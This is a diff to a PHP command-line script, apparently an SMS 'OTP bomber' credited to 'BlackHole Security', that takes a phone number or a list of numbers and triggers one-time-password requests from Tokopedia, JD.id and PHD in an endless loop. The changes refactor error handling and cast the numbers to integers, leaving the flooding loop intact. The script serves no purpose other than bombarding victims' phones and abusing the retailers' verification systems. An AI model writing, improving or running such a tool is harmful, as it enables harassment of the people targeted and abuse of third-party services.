@@ -64,19 +64,19 @@ echo $B."\n".'Team    : BlackHole Security         '.$R.'+';
 echo $B."\n".'Version : 2.5                        '.$R.'+';
 echo $B."\n".'Date    : 13-03-2018                 '.$R.'+';
 echo $R."\n".'++++++++++++++++++++++++++++++++++++++'.$G.$X."\n";
-if(!isset($argv[1])) {
-    fprintf(STDERR,$RR.'[!] Input No List [!]'.$X);
+if($argc<2) {
+    throw new Exception($RR.'[!] Input No List [!]'.$X);
     exit(1);
 }
 try {
     $bom=new Otp();
     $argv[1]=trim($argv[1]);
     if(is_numeric($argv[1])) {
-        $bom->sendOtp($argv[1],'tokopedia');
+        $bom->sendOtp((int)$argv[1],'tokopedia');
         while(1) {
             fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1].']'.$X);
-            $bom->sendOtp($argv[1],'jdid');
-            $bom->sendOtp($argv[1],'phd');
+            $bom->sendOtp((int)$argv[1],'jdid');
+            $bom->sendOtp((int)$argv[1],'phd');
         }
     }
     else if(file_exists($argv[1])) {
@@ -85,16 +85,16 @@ try {
         while(1) {
             for($x=0;$x<$count;$x++) {
                 fprintf(STDOUT,$G.'Send OTP to '.$Y.'['.$argv[1][$x].']'.$X);
-                $bom->sendOtp($argv[1][$x],'tokopedia');
-                $bom->sendOtp($argv[1][$x],'jdid');
-                $bom->sendOtp($argv[1][$x],'phd');
+                $bom->sendOtp((int)$argv[1][$x],'tokopedia');
+                $bom->sendOtp((int)$argv[1][$x],'jdid');
+                $bom->sendOtp((int)$argv[1][$x],'phd');
             }
         }
     }
     else {
-        fprintf(STDERR,$RR.'File not exist'.$argv[1].$X);
+        throw new Exception($RR.'File not exist'.$argv[1].$X);
         exit(1);
     }
 } catch(Exception $e) {
-    echo $e->xdebug_message;
+    echo $e->getMessage()."\n";
 }
